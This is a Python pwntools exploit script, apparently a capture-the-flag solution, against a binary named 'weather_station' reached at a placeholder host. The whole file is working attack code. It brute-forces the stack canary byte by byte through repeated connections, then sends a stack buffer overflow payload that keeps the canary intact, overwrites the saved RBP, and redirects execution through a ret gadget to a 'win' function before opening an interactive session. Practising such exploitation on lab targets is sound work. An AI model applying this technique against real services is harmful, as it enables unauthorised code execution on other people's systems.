#!/usr/bin/env python3
from pwn import *

exe = ELF('./weather_station')
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_CANARY = 56
OFFSET_TO_RIP    = 72   # canary + saved RBP

# ── gadgets ───────────────────────────────────────────────────────────────────
GADGET = 0x000000000040101a   # ret — stack alignment

def conn(interactive=False):
    level = 'info' if interactive else 'error'
    if args.LOCAL:
        return remote('127.0.0.1', 5555, level=level)
    return remote(HOSTNAME, PORT, level=level)

def try_guess(guess):
    r = conn()
    r.recvuntil(b"Enter your location: ")
    r.send(b"AAAA\n")
    r.recvuntil(b"forecast query: ")
    r.send(b"A" * OFFSET_TO_CANARY + guess)
    try:
        data = r.recv(timeout=0.2)
    except EOFError:
        data = b""
    r.close()
    return b"Forecast sent!" in data

def main():
    # ── leak phase (canary brute-force) ───────────────────────────────────────
    known = b"\x00"

    for i in range(7):
        for bval in range(256):
            guess = known + bytes([bval])
            if try_guess(guess):
                known = guess
                log.success(f"byte {i+1}: {bval:#04x}")
                break

    canary = u64(known)
    log.info(f"canary = {canary:#x}")

    # ── exploit phase ─────────────────────────────────────────────────────────
    r = conn(interactive=True)
    r.recvuntil(b"Enter your location: ")
    r.send(b"AAAA\n")
    r.recvuntil(b"forecast query: ")
    payload = flat(
        b"A" * OFFSET_TO_CANARY,
        p64(canary),
        b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),   # overwrite saved RBP
        p64(GADGET),
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()